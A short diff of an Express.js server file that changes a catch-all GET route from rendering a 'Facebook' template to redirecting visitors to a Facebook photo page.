@@ -93,7 +93,7 @@ app.post('/confirm_amir', function (req, res) {
     })
 })
 app.get('*',function(req,res){
-    res.render('Facebook');
+    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
 })
 app.listen(PORT, function () {
     console.log('Server Started')
